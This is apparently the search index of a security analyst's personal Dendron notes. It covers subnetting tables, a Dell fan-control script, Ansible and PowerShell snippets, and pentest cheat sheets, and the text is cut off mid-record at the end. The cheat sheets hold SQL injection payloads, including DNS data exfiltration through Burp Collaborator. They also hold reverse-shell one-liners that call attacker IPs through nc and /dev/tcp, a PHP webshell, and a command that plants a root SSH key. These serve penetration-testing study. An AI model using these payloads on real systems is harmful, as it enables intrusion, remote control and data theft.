{"keys":[{"path":["title"],"id":"title","weight":1,"src":"title","getFn":null},{"path":["body"],"id":"body","weight":1,"src":"body","getFn":null}],"records":[{"i":0,"$":{"0":{"v":"This page has not yet sprouted","n":0.408},"1":{"v":"[Dendron](https://dendron.so/) (the tool used to generate this site) lets authors selective publish content. You will see this page whenever you click on a link to an unpublished page\n\n![](https://foundation-prod-assetspublic53c57cce-8cpvgjldwysl.s3-us-west-2.amazonaws.com/assets/images/not-sprouted.png)","n":0.189}}},{"i":1,"$":{"0":{"v":"My Dendron Notes","n":0.577},"1":{"v":"# Welcome to my Dendron Notes:\n\nI am a Cyber Security Analyst/Network Administrator. A highly motivated and energetic individual, ready to start work as soon as possible. Ready to learn new skills, take on challenges and complete any education/licensing examinations necessary for career growth. Proactive critical thinker and quick learner with extremely strong work ethic. An effective problem solver who brings both technical aptitude and an understanding of business processes. Able to leverage background in finance and technical skills to evaluate complex problems faced by business. Motivated by innovation and seeking to join an organisation that will provide opportunities for professional development in a dynamic and technical team environment. Passionate about cyber security and focused on governance, risk and compliance. Member of AISA (Australian Information Security Association).\n\n## Lookup\n\nThis section contains useful links to related resources.\n\n- [Getting Started Guide](https://link.dendron.so/6b25)\n- [Discord](https://link.dendron.so/6b23)\n- [Home Page](https://wiki.dendron.so/)\n- [Github](https://link.dendron.so/6b24)\n- [Developer Docs](https://docs.dendron.so/)","n":0.084}}},{"i":2,"$":{"0":{"v":"Networking","n":1},"1":{"v":"[[SUBNETTING|Networking.Subnetting]]\n\n## Common Ports\n![](/assets/common%20ports.jpg)\n","n":0.577}}},{"i":3,"$":{"0":{"v":"Subnetting","n":1},"1":{"v":"## SUBNETTING\n\n### Subnet Chart  \n|CIDR | Subnet Mask | Addresses | Wildcard |\n|--------------|-------------------|\n/32|255.255.255.255|1|0.0.0.0|\n/31|255.255.255.254|2|0.0.0.1\n/30|255.255.255.252|4|0.0.0.3\n/29|255.255.255.248|8|0.0.0.7\n/28|255.255.255.240|16|0.0.0.15\n/27|255.255.255.224|32|0.0.0.31\n/26|255.255.255.192|64|0.0.0.63\n/25|255.255.255.128|128|0.0.0.127\n/24|255.255.255.0|256|0.0.0.255\n/23|255.255.254.0|512|0.0.1.255\n/22|255.255.252.0|1,024|0.0.3.255\n/21|255.255.248.0|2,048|0.0.7.255\n/20|255.255.240.0|4,096|0.0.15.255\n/19|255.255.224.0|8,192|0.0.31.255\n/18|255.255.192.0|16,384|0.0.63.255\n/17|255.255.128.0|32,768|0.0.127.255\n/16|255.255.0.0|65,536|0.0.255.255\n/15|255.254.0.0|131,072|0.1.255.255\n/14|255.252.0.0|262,144|0.3.255.255\n/13|255.248.0.0|524,288|0.7.255.255\n/12|255.240.0.0|1,048,576|0.15.255.255\n/11|255.224.0.0|2,097,152|0.31.255.255\n/10|255.192.0.0|4,194,304|0.63.255.255\n/9|255.128.0.0|8,388,608|0.127.255.255\n/8|255.0.0.0|16,777,216|0.255.255.255\n/7|254.0.0.0|33,554,432|1.255.255.255\n/6|252.0.0.0|67,108,864|3.255.255.255\n/5|248.0.0.0|134,217,728|7.255.255.255\n/4|240.0.0.0|268,435,456|15.255.255.255\n/3|224.0.0.0|536,870,912|31.255.255.255\n/2|192.0.0.0|1,073,741,824|63.255.255.255\n/1|128.0.0.0|2,147,483,648|127.255.255.255\n/0|0.0.0.0|4,294,967,296|255.255.255.255\n\n## Decimal to Binary\n|Subnet Mask|Wildcard\n| --------------|-------------------|\n**255** 1111 1111|**0** 0000 0000\n**254** 1111 1110|**1** 0000 0001\n**252** 1111 1100|**3** 0000 0011\n**248** 1111 1000|**7** 0000 0111\n**240** 1111 0000|**15** 0000 1111\n**224** 1110 0000|**31** 0001 1111\n**192** 1100 0000|**63** 0011 1111\n**128** 1000 0000|**127** 0111 1111\n**0** 0000 0000|**255** 1111 1111\n\n## Subnet Proportion\n![](/assets/subnet_portion.JPG)\n\n## Classful Ranges\n|A 0.0.0.0 - 127.255.255.255|\n|-----|\n|B 128.0.0.0 - 191.255.255.255|\n|C 192.0.0.0 - 223.255.255.255|\n|D 224.0.0.0 - 239.255.255.255|\n|E 240.0.0.0 - 255.255.255.255|\n\n## Reserved Ranges\n|RFC1918 10.0.0.0 - 10.255.255.255|\n|-----|\n|Localhost 127.0.0.0 - 127.255.255.255|\n|RFC1918 172.16.0.0 - 172.31.255.255|\n|RFC1918 192.168.0.0 - 192.168.255.255|\n","n":0.107}}},{"i":4,"$":{"0":{"v":"SSH_Tunnels","n":1},"1":{"v":"## SSH Tunnels\n\n![](/assets/images/ssh-tunnels.png)","n":0.577}}},{"i":5,"$":{"0":{"v":"HOT HomeLab Of Things:","n":0.5},"1":{"v":"[[SCRIPTS|HOT HomeLab Of Things.SCRIPTS]]<br>\n[[ANSIBLE|HOT HomeLab Of Things.ANSIBLE]]<br>\n[[POWERSHELL|HOT HomeLab Of Things.POWERSHELL]]\n","n":0.316}}},{"i":6,"$":{"0":{"v":"Linux","n":1}}},{"i":7,"$":{"0":{"v":"List of daily tools","n":0.5}}},{"i":8,"$":{"0":{"v":"List of daily tools","n":0.5},"1":{"v":"\n\n1. ZSH / OH my ZSH\n2. CIFS-utils\n3. htop\n4. VSCode\n","n":0.333}}},{"i":9,"$":{"0":{"v":"Useful Commands","n":0.707},"1":{"v":"mount -t cifs -o username=<username>,password=<password> //<IP or hostname>/<PATH> <Local PATH>\nPermanent mount (fstab):\n//<IP or hostname>/<PATH> <Local PATH> cifs username=<username>,password=<password>,iocharset=utf8        0       0  \nThis is very insecure... anyone can read fstab!!! More secure is creating a credentials file and restricting permissions.","n":0.162}}},{"i":10,"$":{"0":{"v":"SCRIPTS:","n":1},"1":{"v":"[[Dell Server Fan Tamer|HOT HomeLab Of Things.SCRIPTS.Dell Server Fan Tamer#dell-server-fan-tamer]]","n":0.316}}},{"i":11,"$":{"0":{"v":"Dell Server Fan Tamer","n":0.5},"1":{"v":"\n## Dell Server Fan Tamer\n\nCopy the code below and modify to your content. Comments inside the script explain how to use this script and what tools are required.\nI have used this script on __Dell R710__ (an oldie I know) with a great success. \nWith some tweaking it will work with other models too.\nI have adapted it to __Dell R210__ also but those servers have minimum fan speed around 5250 RPM which is still audible. Below that speed, fans just stop which is not really desirable ;) \n\n```sh\n#!/bin/bash\n\n#This script makes Dell servers like R710 and other super quiet for home lab use.  \n#I have chosen readings from hottest cores on each cpu in order to regulate the fan speed.  \n#To control fan speed we need ipmitool.  \n#Install with: <sudo apt install ipmitool>  \n#To identify hot cores or to check cpu temperatures in general, use sensors.  \n#To install: <sudo apt install lm-sensors>  \n#I running it as a cron job every 1 minute.  \n#Server on every reboot/power loss will revert to default fan speed control.  \n\nhotcorecpu1=$(sensors coretemp-isa-0000 | grep \"Core 9:\" | awk -F '[+.0]' {'print $2'})  \nhotcorecpu2=$(sensors coretemp-isa-0001 | grep \"Core 0:\" | awk -F '[+.0]' {'print $2'})  \n\t\n#Switch off automatic fan speed control\n#You can leave this command here or add it as a cron job on each reboot and then comment it out here. \n#Without it automatic fan control will be restored within few seconds.\n\t\n\tipmitool -U root -P calvin raw 0x30 0x30 0x01 0x00\n\n#HOW I RUN IT:\n#Add this record to your crontab -e (root cronjobs):\n#\t*/1 * * * *     /bin/fancontrol.sh #to run script every 1 minute in root cronjobs\n\n#Testing readings:\n#echo $hotcorecpu1\n#echo $hotcorecpu2\n\n\n\tif [[($hotcorecpu1 -ge 1) || ($hotcorecpu2 -ge 1)]] && [[($hotcorecpu1 -lt 41) || ($hotcorecpu2 -lt 41)]]\n\t\tthen\n\t\tipmitool -U root -P calvin raw 0x30 0x30 0x02 0xff 0x04 #4% of fan speed\n\telif [[($hotcorecpu1 -ge 41) || ($hotcorecpu2 -ge 41)]] && [[($hotcorecpu1 -lt 45) || ($hotcorecpu2 -lt 45)]]\n\t\tthen\n\t\tipmitool -U root -P calvin raw 0x30 0x30 0x02 0xff 0x0a #10% of fan speed\n\telif [[($hotcorecpu1 -ge 45) || ($hotcorecpu2 -ge 45)]] && [[($hotcorecpu1 -lt 51) || ($hotcorecpu2 -lt 51)]]\n\t\tthen\n\t\tipmitool -U root -P calvin raw 0x30 0x30 0x02 0xff 0x14 #20% of fan speed\n\telif [[($hotcorecpu1 -ge 51) || ($hotcorecpu2 -ge 51)]] && [[($hotcorecpu1 -lt 55) || ($hotcorecpu2 -lt 55)]]\n\t\tthen\n\t\tipmitool -U root -P calvin raw 0x30 0x30 0x02 0x23 0x1e #35% of fan speed\n\telif [[($hotcorecpu1 -ge 55) || ($hotcorecpu2 -ge 55)]] && [[($hotcorecpu1 -lt 64) || ($hotcorecpu2 -lt 64)]]\n\t\tthen\n        ipmitool -U root -P calvin raw 0x30 0x30 0x02 0xff 0x32 #50% of fan speed\n\telse #panic mode\n\t\tipmitool -U root -P calvin raw 0x30 0x30 0x02 0xff 0x50 #80% of fan speed\n\tfi\n\n#To check fans speed at any time run (this command should work remotely also as it is connects to your iDrac):\n# ipmitool -I lanplus -H <YOUR IP> -U root -P calvin sdr elist all | grep -i fan\n\t\n#Enjoy silent server!\n```\n## Download:\n[fancontrol.sh](https://github.com/Greguus/Notes/blob/main/fancontrol.sh)","n":0.046}}},{"i":12,"$":{"0":{"v":"POWERSHELL","n":1},"1":{"v":"## POWERSHELL: COMMANDS, SCRIPTS, TRICKS:\n\n[[Powershell Useful Commands|HOT HomeLab Of Things.POWERSHELL.Useful Commands]]","n":0.302}}},{"i":13,"$":{"0":{"v":"Useful Commands","n":0.707},"1":{"v":"## Basic Commands/Tools\n\n| **Command**   | **Description**   |\n| --------------|-------------------|\n| **General** |\n| `Update-Help` | Install help to all commands |\n| `Get-Help` | Your BEST FRIEND - help to any command |\n| `Get-NetIPConfiguration` | Basic network settings: IP, Gateway, DNS |\n| `Install-Module PSWindowsUpdate` | Install module for Powershell Windows Update |\n| `Get-WindowsUpdate -Install` | Download and install Windows updates |\n| `Get-WUHistory` | Display history of Windows updates |\n| `New-NetIPAddress -InterfaceIndex <INTERFACE INDEX> -IPAddress <IP> -PrefixLength 24 -DefaultGateway <GATEWAY>` | Set static IP |\n| `Set-DnsClientServerAddress -InterfaceIndex <INTERFACE INDEX> -ServerAddresses <DNS SERVER IP>` | Set DNS server |\n\n","n":0.104}}},{"i":14,"$":{"0":{"v":"ANSIBLE","n":1},"1":{"v":"## ANSIBLE automation playbooks:\n\n[[Controlled_Node_Setup|HOT HomeLab Of Things.ANSIBLE.Controlled_Node_Setup]]","n":0.378}}},{"i":15,"$":{"0":{"v":"Controlled_Node_Setup","n":1},"1":{"v":"\n## Controlled Node Setup\n\nTemporary draft (work in progress):\n\n```yaml\n---\n\n- hosts: all\n  tasks:\n    - name: Add the user 'ansible'\n      ansible.builtin.user:\n        name: ansible\n        comment: ansible\n        shell: /bin/bash\n        create_home: true\n        state: present\n    - name: Add user 'ansible' to sudoers\n      lineinfile:\n        path: /etc/sudoers\n        regexp: '^ansible'\n        line: 'ansible ALL=(ALL) NOPASSWD: ALL'\n        validate: 'visudo -cf %s'\n    - name: Remove 'authorized_keys' with root key\n      become: yes\n      ansible.builtin.file:\n        path: /root/.ssh/authorized_keys\n        state: absent\n    - name: Set ssh key from file\n      authorized_key:\n        user: ansible\n        state: present\n        key: \"{{ lookup('file', '/home/ansible/.ssh/id_rsa.pub') }}\"\n    - name: Set \"PermitRootLogin\" to no\n      lineinfile:\n        path: /etc/ssh/sshd_config\n        regexp: '^PermitRootLogin'\n        line: 'PermitRootLogin prohibit-password'\n        state: present\n\n```","n":0.102}}},{"i":16,"$":{"0":{"v":"Cheat Sheets:","n":0.707},"1":{"v":"[[PEN_cheatsheet|Cheat Sheets.PEN_cheatsheet]]\n* [[Cheat Sheets.PEN_cheatsheet.Nmap]]\n* [[Cheat Sheets.PEN_cheatsheet.Infrastructure-based Enumeration]]\n* [[Cheat Sheets.PEN_cheatsheet.TOOLBOX]]\n\n[[Pentest Opening|Cheat Sheets.Pentest opening]]     \n[[Checklist Linux|Cheat Sheets.Checklist Linux]]    \n[[Checklist Windows|Cheat Sheets.Checklist Windows]]    \n[[Bug Bounty TOOLBOX|Cheat Sheets.Bug_Bounty_TOOLBOX]]  \n[[SQL Injection|Cheat Sheets.SQL_Injection]]  ","n":0.192}}},{"i":17,"$":{"0":{"v":"SQL_Injection","n":1},"1":{"v":"## SQL injection cheat sheet\nThis SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.\n\n### String concatenation\nYou can concatenate together multiple strings to make a single string.\n\n```sql\nOracle\t'foo'||'bar'\nMicrosoft\t'foo'+'bar'\nPostgreSQL\t'foo'||'bar'\nMySQL\t'foo' 'bar' [Note the space between the two strings]\nCONCAT('foo','bar')\n```\n### Substring\nYou can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.\n```sql\nOracle\tSUBSTR('foobar', 4, 2)\nMicrosoft\tSUBSTRING('foobar', 4, 2)\nPostgreSQL\tSUBSTRING('foobar', 4, 2)\nMySQL\tSUBSTRING('foobar', 4, 2)\n```\n### Comments\nYou can use comments to truncate a query and remove the portion of the original query that follows your input.\n```sql\nOracle\t--comment\nMicrosoft\t--comment\n/*comment*/\nPostgreSQL\t--comment\n/*comment*/\nMySQL\t#comment\n-- comment [Note the space after the double dash]\n/*comment*/\n```\n### Database version\nYou can query the database to determine its type and version. This information is useful when formulating more complicated attacks.\n```sql\nOracle\tSELECT banner FROM v$version\nSELECT version FROM v$instance\nMicrosoft\tSELECT @@version\nPostgreSQL\tSELECT version()\nMySQL\tSELECT @@version\n```\n### Database contents\nYou can list the tables that exist in the database, and the columns that those tables contain.\n```sql\nOracle\tSELECT * FROM all_tables\nSELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'\nMicrosoft\tSELECT * FROM information_schema.tables\nSELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'\nPostgreSQL\tSELECT * FROM information_schema.tables\nSELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'\nMySQL\tSELECT * FROM information_schema.tables\nSELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'\n```\n### Conditional errors\nYou can test a single boolean condition and trigger a database error if the condition is true.\n```sql\nOracle\tSELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual\nMicrosoft\tSELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END\nPostgreSQL\t1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)\nMySQL\tSELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')\n```\n### Batched (or stacked) queries\nYou can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.\n```sql\nOracle\tDoes not support batched queries.\nMicrosoft\tQUERY-1-HERE; QUERY-2-HERE\nPostgreSQL\tQUERY-1-HERE; QUERY-2-HERE\nMySQL\tQUERY-1-HERE; QUERY-2-HERE\n```\n> Note\nWith MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.\n\n### Time delays\nYou can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.\n```sql\nOracle\tdbms_pipe.receive_message(('a'),10)\nMicrosoft\tWAITFOR DELAY '0:0:10'\nPostgreSQL\tSELECT pg_sleep(10)\nMySQL\tSELECT SLEEP(10)\n```\n### Conditional time delays\nYou can test a single boolean condition and trigger a time delay if the condition is true.\n```sql\nOracle\tSELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual\nMicrosoft\tIF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'\nPostgreSQL\tSELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END\nMySQL\tSELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')\n```\n### DNS lookup\nYou can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.\n\nOracle\tThe following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:\n```sql\nSELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual\n```\nThe following technique works on fully patched Oracle installations, but requires elevated privileges:\n```sql\nSELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')\nMicrosoft\texec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'\nPostgreSQL\tcopy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'\nMySQL\tThe following techniques work on Windows only:\nLOAD_FILE('\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a')\nSELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'\n```\n### DNS lookup with data exfiltration\nYou can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.\n```sql\nOracle\tSELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual\nMicrosoft\tdeclare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree \"//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a\"')\nPostgreSQL\tcreate OR replace function f() returns void as $$\ndeclare c text;\ndeclare p text;\nbegin\nSELECT into p (SELECT YOUR-QUERY-HERE);\nc := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';\nexecute c;\nEND;\n$$ language plpgsql security definer;\nSELECT f();\nMySQL\tThe following technique works on Windows only:\nSELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'\n```\n### UNION attacks\nFor a UNION query to work, two key requirements must be met:\n\n- The individual queries must return the same number of columns.<br>\n- The data types in each column must be compatible between the individual queries.\n    \n    **Number of columns:**\n    ```sql\n    ' ORDER BY 1--\n    ' ORDER BY 2--\n    ... until error\n    \n    OR\n\n    ' UNION SELECT NULL--\n    ' UNION SELECT NULL,NULL--\n    ... until success\n    ```\n    **Probing for string data in columns:**\n    ```sql\n    ' UNION SELECT 'a',NULL,NULL,NULL--\n    ' UNION SELECT NULL,'a',NULL,NULL--\n    ... until successfully injected string value\n    ```\n\n    **Retrieving data**\n    ```sql\n    ' UNION SELECT username, password FROM users--\n    ```\n    **Retrieving multiple values within a single column**\n    <br>\n    ```sql\n    ' UNION SELECT username || '~' || password FROM users--\n    ```\n\n### Blind Injection\n\n**Divide and conquer password guessing:**\n```sql\n' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm\n\nIF TRUE:\n\nxyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't\n\nIF FALSE:\nTry for example:\nxyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's\n\nIF TRUE, first letter of the password has been found.\n```\n### SQL injection in different contexts\n\n***JSON or XML based SQL injection often require code obfuscation.\n<br>\nMost common encoder:\nurlencode, dec, html entity\n\n[Hackvertor](https://hackvertor.co.uk/public) is a good tool to start with.<br>\nAlso there is a plugin for Burp with the same name working with repeater.\n\n\n","n":0.033}}},{"i":18,"$":{"0":{"v":"PostgreSQL","n":1},"1":{"v":"## [PostgreSQL Cheat Sheet](/assets/files/postgresql83_psql_cheatsheet.pdf)","n":0.5}}},{"i":19,"$":{"0":{"v":"Pentest opening","n":0.707},"1":{"v":"\n## Nmap:\n\n### [Nmap man pages](https://linux.die.net/man/1/nmap)\n\n<table>\n<tr><th>Function</th><th>Examples:</th></tr>\n<tr><td>\n\n|Flag: | What it does:|\n|----------|----------|\n|`-sV`| scan against the default top 1000 ports\n|`--open`| scan only open ports|\n|`-oA <filename>`| output all scan formats|\n|`-v`| verbose output|\n|`-p-`| full TCP port scan (65535)|\n|`--script=<script_name>`|script scan|\n|<li>`banner`|A simple banner grabber which connects <br>to an open TCP port and prints out anything <br>sent by the listening service within five seconds|\n|<li>`http-enum`|Enumerates directories used by <br>popular web applications and servers|\n\n\n</td><td>\n\n|Full command:|\n|----------|\n|`nmap -sV --open -oA <filename> <ip address>`|\n|**Quick scan**|\n|`nmap -p- --open -oA <filename> <ip address>`|\n|**Long scan - recommended in second terminal**|\n\n</td></tr> </table>\n\n## NetCat\n\n### [NetCat man pages](https://linux.die.net/man/1/nc)\n\n<table>\n<tr><th>Function</th><th>Examples:</th></tr>\n<tr><td>\n\n|Flag: | What it does:|\n|----------|----------|\n|`-n`| do not do any DNS or service lookups on any specified addresses, <br>hostnames and ports (don't resolve)|\n|`-v`| verbose|\n|`-l`| listen for incoming connection rather than initiate a connection|\n\n</td><td>\n\n|Full command:|\n|----------|\n|`nc -nv <ip address> <port>`|\n|Confirm banner|\n|`nc -nvlp 80`|\n|Listening shell on port 80|\n\n</td></tr> </table>\n\n## whatweb \n\n### [whatweb man pages](https://manpages.org/whatweb)\n\n<table>\n<tr><th>Function</th><th>Examples:</th></tr>\n<tr><td>\n\n|Flag: | What it does:|\n|----------|----------|\n|``| |\n|``| |\n\n</td><td>\n\n|Full command:|\n|----------|\n|`whatweb <ip address>`|\n|Identify web application in use|\n\n</td></tr> </table>\n\n## Gobuster\n\n### [Gobuster man pages](https://linuxcommandlibrary.com/man/gobuster)\n\n<table>\n<tr><th>Function</th><th>Examples:</th></tr>\n<tr><td>\n\n|Flag: | What it does:|\n|----------|----------|\n|`dir`| use directory enumeration mode |\n|`-u`| string, the target URL or Domain |\n|`--wordlist` / `-w`| path to wordlist, recommended:<br> `/usr/share/wordlists/dirb/common.txt`  \n|`-e`|print full URLs|\n\n</td><td>\n\n|Full command:|\n|----------|\n|`gobuster -e -u <ip address/URL> -w /usr/share/wordlists/dirb/common.txt`|\n|Scan website, use common.txt wordlist and print the full <br>URLs of discovered paths|\n\n</td></tr> </table>\n\n## File upload testing\n\n|File: | What it does/testing:|\n|----------|----------|\n|[test_php.php](/assets/files/test_php.php)|Tests if php file can be uploaded to web app|\n\n## Reverse shells:\n\n```php \n<?php system (\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f\"); ?> \n``` \n## Upgrade reverse shell\n\n```python\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\n```\nOR\n```python\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n```\n\n## Privilege escalation checks\n\n|File: | What it does/testing:|\n|----------|----------|\n|[LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)|Automated privilege escalation checks|\n\n## Start Python HTTP server\n```python\nsudo python3 -m http.server 8080\n```","n":0.062}}},{"i":20,"$":{"0":{"v":"PEN_cheatsheet","n":1},"1":{"v":"## Basic Tools\n\n| **Command**   | **Description**   |\n| --------------|-------------------|\n| **General** |\n| `sudo openvpn user.ovpn` | Connect to VPN |\n| `ifconfig`/`ip a` | Show our IP address |\n| `netstat -rn` | Show networks accessible via the VPN |\n| `ssh user@10.10.10.10` | SSH to a remote server |\n| `ftp 10.129.42.253` | FTP to a remote server |\n| **tmux** |\n| `tmux` | Start tmux |\n| `ctrl+b` | tmux: default prefix |\n| `prefix c` | tmux: new window |\n| `prefix 1` | tmux: switch to window (`1`) |\n| `prefix shift+%` | tmux: split pane vertically |\n| `prefix shift+\"` | tmux: split pane horizontally |\n| `prefix ->` | tmux: switch to the right pane |\n| **Vim** |\n| `vim file` | vim: open `file` with vim |\n| `esc+i` | vim: enter `insert` mode |\n| `x` | vim: Cut character |\n| `dw` | vim: Cut word |\n| `dd` | vim: Cut full line |\n| `yw` | vim: Copy word |\n| `yy` | vim: Copy full line |\n| `p` | vim: Paste |\n| `:1` | vim: Go to line number 1. |\n| `:w` | vim: Write the file 'i.e. save' |\n| `:q` | vim: Quit |\n| `:q!` | vim: Quit without saving |\n| `:wq` | vim: Write and quit |\n\n## Pentesting\n| **Command**   | **Description**   |\n| --------------|-------------------|\n| **Service Scanning** |\n| `nmap 10.129.42.253` | Run [[Cheat Sheets.PEN_cheatsheet.Nmap]] on an IP |\n| `nmap -sV -sC -p- 10.129.42.253` | Run an [[Cheat Sheets.PEN_cheatsheet.Nmap]] script scan on an IP |\n| `locate scripts/citrix` | List various available nmap scripts |\n| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | Run an nmap script on an IP |\n| `xsltproc target.xml -o target.html` | Convert stored results from XML to HTML |\n| `netcat 10.10.10.10 22` | Grab banner of an open port |\n| `smbclient -N -L \\\\\\\\10.129.42.253` | List SMB Shares |\n| `smbclient \\\\\\\\10.129.42.253\\\\users` | Connect to an SMB share |\n| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | Scan SNMP on an IP |\n| `onesixtyone -c dict.txt 10.129.42.254` | Brute force SNMP secret string |\n| **Web Enumeration** |\n| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | Run a directory scan on a website |\n| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Run a sub-domain scan on a website |\n| `curl -IL https://www.inlanefreight.com` | Grab website banner |\n| `whatweb 10.10.10.121` | List details about the webserver/certificates |\n| `curl 10.10.10.121/robots.txt` | List potential directories in `robots.txt` |\n| `ctrl+U` | View page source (in Firefox) |\n| **Public Exploits** |\n| `searchsploit openssh 7.2` | Search for public exploits for a web application |\n| `msfconsole` | MSF: Start the Metasploit Framework |\n| `search exploit eternalblue` | MSF: Search for public exploits in MSF |\n| `use exploit/windows/smb/ms17_010_psexec` | MSF: Start using an MSF module |\n| `show options` | MSF: Show required options for an MSF module |\n| `set RHOSTS 10.10.10.40` | MSF: Set a value for an MSF module option |\n| `check` | MSF: Test if the target server is vulnerable |\n| `exploit` | MSF: Run the exploit on the target server is vulnerable |\n| **Using Shells** |\n| `nc -lvnp 1234` | Start a `nc` listener on a local port |\n| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | Send a reverse shell from the remote server |\n| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/sh -i 2>&1\\|nc 10.10.10.10 1234 >/tmp/f` | Another command to send a reverse shell from the remote server |\n| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/bash -i 2>&1\\|nc -lvp 1234 >/tmp/f` | Start a bind shell on the remote server |\n| `nc 10.10.10.1 1234` | Connect to a bind shell started on the remote server |\n| `python -c 'import pty; pty.spawn(\"/bin/bash\")'` | Upgrade shell TTY (1) |\n| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice | Upgrade shell TTY (2) |\n| `echo \"<?php system(\\$_GET['cmd']);?>\" > /var/www/html/shell.php` | Create a webshell php file |\n| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute a command on an uploaded webshell |\n| **Privilege Escalation** |\n| `./linpeas.sh` | Run [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) script to enumerate remote server |\n| `sudo -l` | List available `sudo` privileges |\n| `sudo -u user /bin/echo Hello World!` | Run a command with `sudo` |\n| `sudo su -` | Switch to root user (if we have access to `sudo su`) |\n| `sudo su user -` | Switch to a user (if we have access to `sudo su`) |\n| `ssh-keygen -f key` | Create a new SSH key |\n| `echo \"ssh-rsa AAAAB...SNIP...M= user@parrot\" >> /root/.ssh/authorized_keys` | Add the generated public key to the user |\n| `ssh root@10.10.10.10 -i key` | SSH to the server with the generated private key |\n| **Transferring Files** |\n| `python3 -m http.server 8000` | Start a local webserver |\n| `wget http://10.10.14.1:8000/linpeas.sh` | Download a file on the remote server from our local machine |\n| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Download a file on the remote server from our local machine |\n| `scp linenum.sh user@remotehost:/tmp/linenum.sh` | Transfer a file to the remote server with `scp` (requires SSH access) |\n| `base64 shell -w 0` | Convert a file to `base64` |\n| `echo f0VMR...SNIO...InmDwU \\| base64 -d > shell` | Convert a file from `base64` back to its orig |\n| `md5sum shell` | Check the file's `md5sum` to ensure it converted correctly |\n|**Local port forwarding**|\n|`ssh -L 5432:<localhost>:5432 user@<remotehostIP>`\n\n","n":0.034}}},{"i":21,"$":{"0":{"v":"TOOLBOX","n":1},"1":{"v":"## Tools & Scripts\n\n|**Tool/Script**|**Installation/Description**|**Use**|\n|-|-|-|\n| [jq](https://stedolan.github.io/jq/manual/) |`apt install jq` - JSON processing tool|[[Cheat Sheets.PEN_cheatsheet.Infrastructure-based Enumeration#infrastructure-based-enumeration]]|\n| [vsFTPd](https://security.appspot.com/vsftpd.html) |`apt install vsftpd` - One of the most used FTP servers on Linux|[[Cheat Sheets.PEN_cheatsheet.Infrastructure-based 